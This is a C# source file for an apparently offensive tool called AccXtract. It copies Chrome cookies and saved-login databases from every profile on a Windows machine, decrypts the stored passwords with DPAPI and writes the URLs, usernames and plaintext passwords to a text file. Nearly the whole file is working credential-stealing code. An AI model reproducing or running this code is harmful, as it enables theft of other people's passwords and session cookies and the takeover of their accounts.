//Copyright 2013 Garrett Davidson
//
//This file is part of AccXtract
//
//    AccXtract is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    AccXtract is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with AccXtract.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.ComponentModel;


namespace Grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string cd = Directory.GetCurrentDirectory();
            string home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");

            cd += "\\AccXtract\\" + Environment.MachineName;

            grabChromeData(cd, home);
            decryptChromePasswords(cd, home);
            
        }


        static void grabChromeData(string cd, string home)
        {
            if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
            {

                Directory.CreateDirectory(cd + "\\Chrome\\Default");

                //Default's cookies
                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\Chrome\\Default\\cookies", true);

                //Default's encrypted login data
                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", cd + "\\Chrome\\Default\\Login Data", true);


                string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";

                List<string> list = new List<string>();
                System.IO.StreamReader file = new StreamReader(chromePath + @"\Local State");

                int currentNumberOfProfiles = 0;
                string line;
                bool foundProfile = false;
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Contains(@"Profile "))
                    {

                        string[] values = line.Split('"');
                        list.Add(values[1]);
                        foundProfile = true;

                        currentNumberOfProfiles++;
                    }
                    else if (line.Contains(@"""name"":") && foundProfile)
                    {
                        string[] values = line.Split('"');
                        foundProfile = false;
                        list.Add(values[3]);
                    }
                }

                while (list.Count != 0)
                {
                    Directory.CreateDirectory(cd + "\\Chrome\\" + list[1]);

                    //cookies
                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\Chrome\\" + list[1] + "\\Cookies", true);

                    //encrypted login data
                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Login Data", cd + "\\Chrome\\" + list[1] + "\\Login Data", true);


                    list.RemoveAt(0);
                    list.RemoveAt(0);
                }

                file.Close();
            }
        }

        static void decryptChromePasswords(string cd, string home)
        {
            cd += "\\Chrome";

            if (Directory.Exists(cd))
            {

                foreach (string profile in Directory.GetDirectories(cd))
                {
                    SQLiteConnection conn = new SQLiteConnection("Data Source=" + profile + "\\Login Data");

                    conn.Open();

                    SQLiteCommand retrieveData = conn.CreateCommand();
                    retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                    SQLiteDataReader data = retrieveData.ExecuteReader();

                    List<string> decryptedData = new List<string>();
                    while (data.Read())
                    {
                        string url = (string)data["action_url"];
                        string username = (string)data["username_value"];
                        string decryptedPassword = "";

                        byte[] encryptedPassword = (byte[])data["password_value"];

                        byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);

                        decryptedPassword = Encoding.Default.GetString(outBytes);

                        if (decryptedPassword != "")
                        {
                            decryptedData.Add(url);
                            decryptedData.Add(username);
                            decryptedData.Add(decryptedPassword);
                        }
                    }

                    File.WriteAllLines(profile + "\\passwords.txt", decryptedData.ToArray());

                    conn.Close();
                }
            }
        }
    }
}
